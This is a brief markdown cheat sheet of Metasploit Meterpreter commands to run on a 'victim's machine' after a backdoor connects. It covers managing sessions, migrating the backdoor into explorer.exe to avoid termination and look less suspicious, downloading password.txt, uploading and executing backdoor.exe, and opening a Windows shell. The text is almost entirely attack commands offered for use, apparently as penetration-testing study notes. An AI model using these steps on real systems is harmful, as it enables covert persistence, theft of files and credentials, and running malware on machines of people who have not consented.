# Meterpreter basics (Metasploit)
-   commands to run after gaining access to the victims machine using created backdoor and catching connection in Metasploit

## Background
```bash
background
```
-   backgrounds the current session => gets back to the `msfconsole` and keeps the session runing in the background
-   to see all the sessions running in the bg use `sessions -l`
-   to get back into the session use `sessions -i 2`, 2 is the number of the session

## Migrate
```bash
sysinfo # shows info about machine (operating system, architecture, meterpreter etc.)
ps  # list all the processes running on the machine, find for example explorer.exe and put the id to migrate command
migrate 2115 # this migrates the backdoor process which we are connected through to specified process number
```
-   it is always good idea to migrate backdoor process to trusted one, that it won't be terminated. Good example on windows is explorer.exe
-   after migration it will look like windows is connected to port 8080, which is kinda normal behaviour => less suspicious

## Download, Upload, Execute
```bash
download password.txt # downloads the file from the victims machine
upload backdoor.exe # upload the file to the victims machine
execute backdoor.exe # execute the file
```

## Shell
```bash
shell # switch from meterpreter to windows shell
``` 